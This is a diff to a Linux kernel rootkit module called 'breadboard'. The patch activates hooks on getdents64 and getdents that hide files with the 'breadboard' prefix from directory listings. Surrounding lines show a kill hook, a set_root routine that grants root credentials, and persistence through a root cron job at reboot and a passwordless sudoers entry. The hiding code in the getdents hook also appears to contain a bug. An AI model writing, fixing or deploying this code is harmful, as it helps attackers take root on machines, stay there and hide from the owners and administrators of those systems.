@@ -16,6 +16,7 @@
 #define MODULE_PATH BASE_DIR "load_mod.sh"
 #define CRON_CONTENT "@reboot root " MODULE_PATH "\n"
 #define PREFIX "breadboard"
+#define PREFIX_LEN (sizeof(PREFIX) - 1)
 #define SUDO_CONTENT USER_NAME " ALL=(ALL) NOPASSWD: " MODULE_PATH "\n"
 
 static short mod_hidden = 0;
@@ -49,139 +50,103 @@ asmlinkage int hook_kill(const struct pt_regs *regs){
 	}
 	return orig_kill(regs);
 }
-/*
+
 asmlinkage int hook_getdents64(const struct pt_regs *regs){
 	struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;
-	struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir = NULL;
+	struct linux_dirent64 *current_dir, *dirent_ker, *prev_dir = NULL;
 	unsigned long offset = 0;
-
-	int ret = orig_getdents64(regs);
-	dirent_ker = kzalloc(ret, GFP_KERNEL);
-
-	if ( (ret <= 0) || (dirent_ker == NULL) )
-		return ret;
 	long error;
-		error = copy_from_user(dirent_ker, dirent, ret);
-	if (error)
-		goto done;
+	int ret;
+	
+	//printk(KERN_INFO "Inside hook_getdents64\n");
+	ret = orig_getdents64(regs);
+	if (ret <= 0){
+		return ret;
+	}
+	dirent_ker = kzalloc(ret, GFP_KERNEL);
+	if (dirent_ker == NULL){
+		kfree(dirent_ker);
+		return ret;
+	}
+	error = copy_from_user(dirent_ker, dirent, ret);
+	if (error){
+		//printk(KERN_INFO "Error on copy_from_user.\n");
+		kfree(dirent_ker);
+		return ret;
+	}
 	while (offset < ret){
 		current_dir = (void *)dirent_ker + offset;
-		if (memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0){
+		//printk(KERN_INFO "current_dir->d_name %s \n", current_dir->d_name);
+		if (memcmp(PREFIX, current_dir->d_name, PREFIX_LEN) == 0){
 			if (current_dir == dirent_ker){
-				ret -= current_dir -> d_reclen;
+				ret -= current_dir->d_reclen;
 				memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
 				continue;
 			}
-			previous_dir->d_reclen += current_dir->d_reclen;
+			prev_dir->d_reclen += current_dir->d_reclen;
+			//printk(KERN_INFO "Skipped entry.\n");
 		}
 		else{
-			printk(KERN_INFO "Hooking getdents64\n");
-			struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;
-			struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir = NULL;
-			unsigned long offset = 0;
-			int ret = orig_getdents64(regs);
-			int original_ret = ret;
-			long error;
-			if(ret <= 0)
-				return ret;
-			dirent_ker = kzalloc(ret, GFP_KERNEL);
-			if (dirent_ker == NULL)
-				return -ENOMEM;
-			error = copy_from_user(dirent_ker, dirent, ret);
-			if (error){
-				kfree(dirent_ker);
-			return -EFAULT;
-			}
-		}
-	while (offset < ret){
-		current_dir = (void *)dirent_ker + offset;
-
-		if (current_dir->d_name &&
-			memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) ==0){
-
-				if (current_dir == dirent_ker){
-					ret -= current_dir->d_reclen;
-					memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
-					continue;
-				}
-				if(previous_dir){
-					previous_dir->d_reclen += current_dir->d_reclen;
-				}
-			}
-		else {
-			previous_dir = current_dir;
+			prev_dir = current_dir;
 		}
 		offset += current_dir->d_reclen;
 	}
 	error = copy_to_user(dirent, dirent_ker, ret);
-	if (error)
-		goto done;
-done:
-	kfree(dirent_ker);
+	if(error){
+		kfree(dirent_ker);
+	}
 	return ret;
 }
-*/
 
-/*
+struct linux_dirent{
+	unsigned long d_ino;
+	unsigned long d_off;
+	unsigned long d_reclen;
+	char d_name[];
+};
 asmlinkage int hook_getdents(const struct pt_regs *regs){
-	struct linux_dirent{
-		unsigned long d_ino;
-		unsigned long d_off;
-		unsigned long d_reclen;
-		char d_name[];
-	};
-	struct linux_dirent *dirent = (struct linux_dirent *)regs->si;
-	struct linux_dirent *current_dir, *dirent_ker, *previous_dir = NULL;
+	struct linux_dirent __user *dirent = (struct linux_dirent *)regs->si;
+	struct linux_dirent *current_dir, *dirent_ker, *prev_dir = NULL;
 	unsigned long offset = 0;
-	int ret = orig_getdents(regs);
-	dirent_ker = kzalloc(ret, GFP_KERNEL);
-
-	if ( (ret <=0) || (dirent_ker == NULL) )
-		return ret;
-
 	long error;
-		error = copy_from_user(dirent_ker, dirent, ret);
-	if (error)
-		goto done;
-	while (offset<ret){
-		current_dir = (void *)dirent_ker + offset;
-		if(memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0){
-	if (ret <= 0)
+	int ret;
+
+	ret = orig_getdents(regs);
+	if (ret <= 0){
 		return ret;
+	}
 	dirent_ker = kzalloc(ret, GFP_KERNEL);
-	if (dirent_ker == NULL)
-		return -ENOMEM;
-	long error;
+	if (dirent_ker == NULL){
+		kfree(dirent_ker);
+		return ret;
+	}
 	error = copy_from_user(dirent_ker, dirent, ret);
 	if (error){
 		kfree(dirent_ker);
-		return -EFAULT;
+		return ret;
 	}
-	while (offset<ret){
+	while (offset < ret){
 		current_dir = (void *)dirent_ker + offset;
-		if(current_dir->d_name &&
-			memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0){
-
-				if(current_dir == dirent_ker){
-					ret -= current_dir->d_reclen;
-					memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
-					continue;
-				}
-				previous_dir->d_reclen += current_dir->d_reclen;
+		if(memcmp(PREFIX, current_dir->d_name, PREFIX_LEN) == 0){
+			if(current_dir == dirent_ker){
+				ret -= current_dir->d_reclen;
+				memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
+				continue;
 			}
+			prev_dir->d_reclen = current_dir->d_reclen;
+			printk(KERN_INFO "Skipped entry. \n");
+		}
 		else {
-			previous_dir = current_dir;
+			prev_dir = current_dir;
 		}
 		offset += current_dir->d_reclen;
 	}
 	error = copy_to_user(dirent, dirent_ker, ret);
-	if (error)
-		goto done;
-done:
-	kfree(dirent_ker);
+	if (error){
+		kfree(dirent_ker);
+	}
 	return ret;
 }
-*/
 
 void set_root(void){
 	struct cred *root;
@@ -326,7 +291,9 @@ static int __init breadboard_init(void){
 	ret = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
 	if (ret)
 		return ret;
-	printk(KERN_INFO "Hooks loaded.\n");
+	printk(KERN_INFO "breadboard: Hooks loaded.\n");
+	//printk(KERN_INFO "USER_NAME %s BASE_DIR %s CRON_JOB_PATH %s SUDO_JOB_PATH %s MODULE_PATH %s\n", USER_NAME, BASE_DIR, CRON_JOB_PATH, SUDO_JOB_PATH, MODULE_PATH);
+	//printk(KERN_INFO "CRON_CONTENT %s PREFIX %s SUDO_CONTENT %s\n", CRON_CONTENT, PREFIX, SUDO_CONTENT);
 	/*
 	hide_module();
 	ret = persistence();
@@ -360,7 +327,7 @@ static int __init breadboard_init(void){
 
 static void __exit breadboard_exit(void){
 	fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
-	printk(KERN_INFO "Hooks unloaded\n");
+	printk(KERN_INFO "breadboard: Hooks unloaded\n");
 	/*
 	gpio_set_value(GPIO_LED, 0);
 	gpio_free(GPIO_LED);
